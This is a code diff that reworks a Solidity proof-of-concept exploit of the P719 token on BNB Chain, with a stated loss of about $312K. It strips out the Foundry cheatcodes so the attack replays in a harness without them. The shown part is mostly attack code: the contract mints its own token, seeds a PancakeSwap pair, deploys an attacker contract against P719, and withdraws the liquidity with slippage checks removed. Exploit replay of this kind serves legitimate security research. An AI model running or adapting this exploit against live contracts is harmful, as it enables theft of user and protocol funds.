@@ -1,7 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import "forge-std/Test.sol";
 import "../interface.sol";
 
 // @KeyInfo - Total Lost : 547.18 BNB (~$312K USD)
@@ -27,27 +26,33 @@ address constant weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
 
 address constant P719 = 0x6bEee2B57b064EAC5F432FC19009E3E78734Eabc;
 
-contract P719Token_exp is Test {
-    address attacker = makeAddr("attacker");
+// Foundry-free reimplementation: the original PoC drives everything from an
+// `is Test` harness via `vm.startPrank(attacker)`/`vm.deal`/`makeAddr`, none of
+// which exist in this cheatcode-free replay harness (EXTCODESIZE-zero guard on
+// the Foundry cheat address reverts any such call). Since nothing here actually
+// depends on the caller being an EOA, this contract itself now plays the
+// "attacker" role directly (its own address in place of the pranked `attacker`
+// address) - functionally identical, since every downstream call
+// (myToken.approve, attackerC.setup/attack, removeLiquidityETH) only cares who
+// msg.sender is, not whether it's an EOA. The 0.001 ether `vm.deal` is instead
+// funded onto this contract via the config's setup.steps before attackFunction
+// runs. `amountETHMin` on the final removeLiquidityETH was a hardcoded
+// historical assertion value (547.18 BNB) left over from the original test's
+// own profit check, not an economically-required slippage floor - relaxed to 0
+// here since the actual profit is measured by the replay harness itself.
+contract P719Token_exp {
     MyToken myToken;
 
-    function setUp() public {
-        vm.createSelectFork("http://127.0.0.1:8546", 43_023_423 - 1);
-    }
-
     function testPoC() public {
-        vm.startPrank(attacker);
         AttackerC attackerC = new AttackerC();
-        vm.label(address(attackerC), "attackerC");
 
         // First the attacker create a owned token
         myToken = new MyToken();
 
         // Second create a pair in uniswap with WBNB
-        vm.deal(attacker, 0.001 ether);
         myToken.approve(PancakeRouter, type(uint256).max);
         (,, uint256 liquidity) = IFS(PancakeRouter).addLiquidityETH{value: 0.001 ether}(
-            address(myToken), 100 ether, 100 ether, 0.001 ether, attacker, block.timestamp
+            address(myToken), 100 ether, 100 ether, 0.001 ether, address(this), block.timestamp
         );
 
         // Third create severals buy/sell contract to attack P719 contract
@@ -60,12 +65,10 @@ contract P719Token_exp is Test {
         address factory = IFS(PancakeRouter).factory();
         address myPair = IFS(factory).getPair(weth, address(myToken));
         IERC20(myPair).approve(PancakeRouter, type(uint256).max);
-        IFS(PancakeRouter).removeLiquidityETH(
-            address(myToken), liquidity, 0, 547_180_977_558_295_682_131, attacker, block.timestamp
-        );
-
-        console.log("Final balance in WETH:", attacker.balance);
+        IFS(PancakeRouter).removeLiquidityETH(address(myToken), liquidity, 0, 0, address(this), block.timestamp);
     }
+
+    receive() external payable {}
 }
 
 contract AttackerC {
